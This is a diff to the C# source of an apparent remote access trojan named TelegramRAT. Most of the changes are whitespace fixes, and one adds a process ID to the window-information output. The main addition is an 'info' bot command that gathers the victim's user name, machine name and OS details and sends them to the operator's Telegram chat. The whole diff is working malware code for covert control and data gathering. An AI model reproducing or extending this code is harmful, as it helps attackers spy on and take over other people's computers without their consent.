@@ -413,7 +413,7 @@ namespace TelegramRAT
                                 procInfo += $"\nMain Window Handle: <code>0x{proc.MainWindowHandle.ToString("X")}</code>\n";
 
                             Bot.SendTextMessageAsync(model.Message.Chat.Id, procInfo, ParseMode.Html, replyToMessageId: model.Message.MessageId);
-                            
+
                         }
                         catch (Exception ex)
                         {
@@ -993,11 +993,13 @@ namespace TelegramRAT
                                 $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                                 $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                                 $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
-                                $"Pointer: <code>0x{hWnd.ToString("X")}</code>";
+                                $"Pointer: <code>0x{hWnd.ToString("X")}</code>\n" +
+                                $"Process Id: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
+
                                 Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);
                                 return;
                             }
-                            
+
                             if (model.Args.Length > 1)
                             {
                                 if (model.Args[1].Contains("0x"))
@@ -1028,7 +1030,7 @@ namespace TelegramRAT
                                         $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                                         $"Pointer: <code>0x{hWnd.ToString("X")}</code>\n" +
                                         $"Process Id: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
-                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);                                        
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);
                                         break;
 
                                     case "min":
@@ -1776,6 +1778,27 @@ namespace TelegramRAT
                         cmd.Execute(newmodel);
                     else
                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Unable to repeat command from this message");
+                }
+            });
+
+            //INFO
+            CommandsList.Add(new BotCommand
+            {
+                Command = "info",
+
+                Description = "Get info about environment and this program process",
+                Execute = model =>
+                {
+                    string sysInfo =
+                    $"User name: {Environment.UserName}\n" +
+                    $"PC name: {Environment.MachineName}\n\n" +
+
+                    $"OS: {GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
+                    $"NT version: {Environment.OSVersion.Version}\n" +
+                    $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n";
+                    
+
+                    Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
                 }
             });
 
